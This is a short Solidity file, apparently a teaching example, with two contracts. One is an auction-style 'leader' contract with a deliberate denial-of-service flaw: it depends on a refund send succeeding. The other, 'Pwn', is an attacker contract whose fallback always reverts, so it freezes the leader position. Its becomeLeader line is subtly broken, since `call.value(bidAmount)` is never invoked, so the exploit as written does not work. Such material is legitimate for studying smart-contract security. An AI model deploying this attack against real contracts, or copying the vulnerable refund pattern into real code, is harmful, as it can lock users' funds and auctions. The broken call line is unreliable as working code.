pragma solidity ^0.4.18;
contract CallToTheUnknown {
  // Highest bidder becomes the Leader. 
  // Vulnerable to DoS attack by an attacker contract which reverts all transactions to it.

    address currentLeader;
    uint highestBid;

    function() payable {
        require(msg.value > highestBid);
        require(currentLeader.send(highestBid)); // Refund the old leader, if it fails then revert
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract Pwn {
  // call become leader 
  function becomeLeader(address _address, uint bidAmount) {
    _address.call.value(bidAmount);
  }
    
  // reverts anytime it receives ether, thus cancelling out the change of the leader
  function() payable {
    revert();
  }
}